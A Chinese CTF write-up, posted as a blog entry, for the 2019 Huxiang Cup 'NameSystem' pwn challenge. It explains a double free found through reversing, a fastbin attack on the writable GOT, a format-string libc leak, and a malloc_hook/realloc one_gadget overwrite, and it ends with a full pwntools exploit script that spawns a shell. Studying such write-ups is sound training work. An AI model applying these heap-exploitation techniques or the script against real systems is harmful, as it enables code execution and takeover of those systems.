@@ -1,0 +1,362 @@
+---
+layout: post
+title:  "湖湘杯2019 pwn"
+categories: pwn
+tags: pwn
+excerpt: 湖湘杯2019 pwn
+mathjax: true
+---
+
+* content
+{:toc}
+
+### Overview
+复盘一下湖湘杯复赛的NameSystem题目
+
+### NameSystem
+
+#### 逆向分析
+
+1. 检查保护
+```
+[*] '/mnt/hgfs/share/HuXiang/Name/NameSystem'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+GOT表可写，没有PIE
+
+2. 程序功能
+```
+Welcome to this easy name system!
+1.add name
+2.show name
+3.drop name
+4.exit
+Your choice :
+```
+show函数是假的 
+
+```c
+int new()
+{ ...
+  for ( i = 0; ptr[i] && i <= 19; ++i )
+    ;
+  if ( i > 19 )
+    return puts("Not any more !!");
+  printf("Name Size:");
+  v2 = readchoice();
+  if ( v2 <= 0xF || v2 > 0x60 )
+    return puts("Invalid size !!");
+  printf("Name:");
+  ptr[i] = malloc(v2);
+  read_con((__int64)ptr[i], v2);
+  return puts("Done!");
+}
+```
+new函数添加堆块限制在0xf ~ 0x60
+```c
+int delete()
+{
+  int v1; // [rsp+Ch] [rbp-4h]
+
+  printf("The id you want to delete:");
+  v1 = readchoice();
+  if ( v1 < 0 || v1 > 19 || !ptr[v1] )
+    return puts("Invalid id !!");
+  free(ptr[v1]);
+  ptr[v1] = 0LL;
+  while ( v1 + 1 <= 19 )
+  {
+    ptr[v1] = ptr[v1 + 1];
+    ++v1;
+  }
+  return puts("Done!");
+}
+```
+
+* delete
+delete 函数中后面包含将heap指针提前的操作，例如 存在堆块 1,2,3,4 删除堆块2 , 则变成1,3,4 . 
+乍一看好像没有问题，但是如果heap指针填满的20个的话，也就是v1=19 时会跳出循环，没有进行拷贝。
+例如 0,1,2,3, ... 17,18,19  如果删除18,原位置会填充上19，而到19时什么也不做，那么内存里就有了两个19指针。变成了 0,1,2,3, ... 17,19,19
+因此会导致double free。
+
+* 读取用户输入函数中有补零操作,将结尾的\n 改成\x00
+
+
+### 利用思路
+
+1. 泄露libc
+
+  * 存在double free
+  * 只有fastbin
+  * GOT表可写
+
+尝试用fastbin attack 把GOT表申请出来，把printf_plt 放到free_got中解决泄露libc的问题 
+
+2. 覆盖malloc_hook 为onegadget (fastbin attack 常用技巧)，因为free_got 修改过后free函数就不能用了，所以在此之前要把所有的条件准备好，只留下最后的add操作
+
+### 漏洞利用过程
+
+#### 1. 构造double free
+
+```python
+for i in range(17):
+    new(0x10,"aaa")
+
+for i in range(3):
+    new(0x50,"bbb") # got表区域存在fake size 0x60
+
+de(18)
+de(18)
+de(17)
+de(19)
+```
+
+此时fastbin  
+`0x60: 0x16512e0 —▸ 0x1651220 ◂— 0x16512e0 `  
+0x16512e0 在fastbin 中两次 
+
+此时在got表中查找可以伪造的size  
+`0000| 0x602000 --> 0x601e28 --> 0x1`  
+错位构造出0x60
+```
+gdb-peda$ x/4gx 0x602000+2-8
+0x601ffa:       0x1e28000000000000      0xf168000000000060
+```
+
+```python
+tar = 0x602000+2-8
+new(0x50,p64(tar))
+new(0x50,"ccc")
+new(0x50,"ddd")
+```
+明明size的位置是0xf168000000000060 , 为什么还可以当作0x60使用? 
+
+![](IMG/HuXiang/fastbin.png)
+
+r14=0x601ffa , 在size校验的时候用eax获取size,会忽略高位的0xf168
+
+#### 2. 泄露地址
+
+* 覆盖free的got表为printf_plt(注意不要影响到下面的puts_got)
+
+* 确认栈中的libc函数位置
+刚开始用"%8$x.%9$x.%10$x"填充到前17个堆块中后再free它们，来测试 printf泄露的位置，再从其中查找stack上的libc地址。64位下前6个参数取寄存器的值，而不是栈中的值，所以取8，9，10来定位位置。
+输出结果是 5408ef20.400c24.5408f000
+```
+│0000| 0x7fff5408eef0 --> 0x400750 (xor    ebp,ebp)
+│0008| 0x7fff5408eef8 --> 0x21bc2d00
+│0016| 0x7fff5408ef00 --> 0x7fff5408ef20 --> 0x400c50 (push   r15)
+│0024| 0x7fff5408ef08 --> 0x400c24 (jmp    0x400c44)
+│0032| 0x7fff5408ef10 --> 0x7fff5408f000 --> 0x1
+│0040| 0x7fff5408ef18 --> 0x300000000
+│0048| 0x7fff5408ef20 --> 0x400c50 (push   r15)
+│0056| 0x7fff5408ef28 --> 0x7ff02c5d8730 (<__libc_start_main+240>:       mov    edi,eax)
+│0064| 0x7fff5408ef30 --> 0x1
+```
+
+%10$x 对应 0x7fff5408f000 , 泄露出__libc_start_main+240 应该用%13$p
+
+```
+new(0x50,"a"*6+p64(0)+p64(printf_plt)[:7])
+de(0)
+libc.address = int(r(14),16) - libc.sym["__libc_start_main"]-240
+```
+
+#### 3. 构造覆盖malloc_hook
+
+构造方法依然是fastbin attack，泄露libc过程中会把free_got覆盖，此后就不能用free了，因此这两步要同步进行。
+同时准备好两个fastbin attack 的环境如下,再执行后续leak libc 和覆盖malloc_hook的操作
+```
+0x60 : 19 -> 18 -> 19
+0x70 : 19 -> 18 -> 19
+```
+
+常见的方法是覆盖onegadget到malloc_hook,但是onegadget的使用是有条件的，比如
+```
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+如果4个条件都不满足，我们还可以用realloc_hook 给自己续一秒
+realloc_hook的位置和malloc_hook相邻
+```
+gdb-peda$ p &__realloc_hook
+$3 = (void *(**)(void *, size_t, const void *)) 0x7f93d701eb08 <__realloc_hook>
+gdb-peda$ p &__malloc_hook
+$4 = (void *(**)(size_t, const void *)) 0x7f93d701eb10 <__malloc_hook>
+```
+可以构造`padding+p64(one)+p64(realloc+x) `通过调整realloc的地址，来找出满足onegadget的条件。
+
+先用realloc的地址查看情况，以0x4526a 为例 需要 ` [rsp+0x30] == NULL` 可是查看rsp+0x30并不满足条件
+`rsp+0x30 : 0x7ffec63d63b8 --> 0x100000000`
+
+查看周围
+![](IMG/HuXiang/realloc.png)
+
+realloc内部
+![](IMG/HuXiang/realloc2.png)
+
+从realloc+20开始，构造"a"*0xb+p64(one)+p64(realloc+20)
+发现 $rsp+0x70 为0 , 满足0xf1147的条件成功getshell
+关于栈空间内存值和realloc地址之间的关系还是高度依赖环境。
+
+### 利用脚本
+
+```
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import *
+import sys
+import os
+debug = 1
+exe = "./NameSystem"
+
+r = lambda x:io.recv(x)
+ru = lambda x:io.recvuntil(x)
+rud = lambda x:io.recvuntil(x,drop=True)
+rul = lambda:io.recvline()
+sd = lambda x:io.send(x)
+sl = lambda x:io.sendline(x)
+sea = lambda x,y:io.sendafter(x,y)
+sela = lambda x,y:io.sendlineafter(x,y)
+
+context.terminal = ["tmux","splitw","-h"]
+elf = ELF(exe)
+context.arch = elf.arch
+
+if debug:
+    context.log_level = "debug"
+
+arena64 = 0x3c4b20
+arena32 = 0x1b2780
+
+def pre(libc_version):
+    glibc_dir = '/glibc/{arch}/{libc}/lib/libc-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
+    ld_dir = '/glibc/{arch}/{libc}/lib/ld-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
+    if libc_version==0:
+        io = process(exe)
+        return io
+    else:
+        io = process(exe,env={"LD_PRELOAD":glibc_dir})
+        cmd = "patchelf --set-interpreter {} {}".format(ld_dir,os.getcwd()+"/"+exe)
+        os.system(cmd)
+        return io
+ 
+def dbg(breakpoint=0):
+    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16)if elf.pie else 0 
+    if breakpoint!=0:
+        gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+        gdb.attach(io, gdbscript)
+        time.sleep(1)
+    else:
+        cmd = "b *realloc\nb *malloc\nb *0x400A0E\n "
+        gdb.attach(io,cmd)
+
+if len(sys.argv)>1:
+    io = remote(sys.argv[1],int(sys.argv[2]))
+    #libc = ELF("./libc.so.6")
+else:
+    io = pre(0)
+    libc = elf.libc
+
+def new(size,con,line=1):
+    sela(":\n","1")
+    sela(":",str(size))
+    if line==1:
+        sela(":",str(con))
+    else:
+        sea(":",str(con))
+
+def de(ind):
+    sela(":\n","3")
+    sela(":",str(ind))
+
+for i in range(17):
+    new(0x10,"%13$p")
+for i in range(3):
+    new(0x50,"bbb")
+de(18)
+de(18)
+de(17)
+de(19)
+
+# 17 18 处都存放着19的地址，因此需要整体前移两位
+de(0)
+de(0)
+# 创造0x60 的fastbin attack 环境
+new(0x60,"xxx") #17
+new(0x60,"xxx") #18
+new(0x60,"xxx") #19
+
+de(18)
+de(18)
+de(17)
+de(19)
+
+'''
+0x60: 0x11982e0 —▸ 0x1198220 ◂— 0x11982e0
+0x70: 0x1198420 —▸ 0x1198340 ◂— 0x1198420
+'''
+# clean 
+for i in range(5):
+    de(0)
+
+# fastbin attack to got 
+tar = 0x602000+2-8
+new(0x50,p64(tar))
+new(0x50,"ccc")
+new(0x50,"ddd")
+# overwrite free_got
+printf_plt = elf.plt["printf"]
+new(0x50,"a"*6+p64(0)+p64(printf_plt)[:7])
+de(0)
+
+# fastbin to malloc_hook
+libc.address = int(r(14),16) - libc.sym["__libc_start_main"]-240
+print hex(libc.address)
+one = libc.address +0xf1147
+m_hook = libc.sym["__malloc_hook"]
+realloc = libc.sym["realloc"]
+'''
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+for i in range(5):
+    de(0)
+
+# attack to malloc_hook,realloc_hook
+new(0x60,p64(m_hook-0x23))
+new(0x60,"aa")
+new(0x60,"aa")
+new(0x60,"a"*0xb+p64(one)+p64(realloc+20))
+
+print hex(one)
+new(0x10,"/bin/sh")
+
+io.interactive()
+
+```
+
+### 参考
+
+[realloc_hook调整onegadget](https://blog.csdn.net/Maxmalloc/article/details/102535427)
+
+[湖湘杯部分wp](https://mp.weixin.qq.com/s/4xMLgNek5uYkT8OhC6miew)
+
